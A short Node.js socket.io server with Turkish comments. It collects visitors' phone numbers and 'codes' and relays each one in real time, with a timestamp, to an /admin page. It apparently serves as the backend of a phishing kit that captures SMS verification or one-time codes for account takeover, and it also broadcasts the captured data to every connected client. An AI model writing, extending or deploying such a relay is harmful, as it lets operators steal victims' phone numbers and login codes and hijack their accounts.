const express = require('express');
const app = express();
const http = require('http').createServer(app);
const path = require('path');

const io = require('socket.io')(http, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"],
    allowedHeaders: ["Content-Type"],
    credentials: true
  }
});

app.use(express.static(path.join(__dirname, "")));

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "", "index.html"));
});

app.get("/admin", (req, res) => {
  res.sendFile(path.join(__dirname, "", "admin.html"));
});

// 🔥 USER ARRAY
let users = [];

io.on('connection', (socket) => {
  console.log('Bir kullanıcı bağlandı');

  // TELEFON
  socket.on('new-phone', (phone) => {
    console.log('Yeni telefon: ' + phone);
    io.emit('admin-new-phone', {
      phone: phone,
      date: new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' })
    });
  });

  // KOD
  socket.on('new-code', (code) => {
    console.log('Yeni code: ' + code);
    io.emit('admin-new-code', {
      code: code,
      date: new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' })
    });
  });

  // YENİ KULLANICI
  socket.on('new-user', (data) => {
    console.log('Yeni kullanıcı geldi:', data);

    users.push(data);

    io.emit('update-users', users);
  });

  socket.on('disconnect', () => {
    console.log('Kullanıcı ayrıldı');
  });
});

const port = process.env.PORT || 3000;
http.listen(port, () => {
  console.log(`Sunucu ${port} portunda çalışıyor`);
});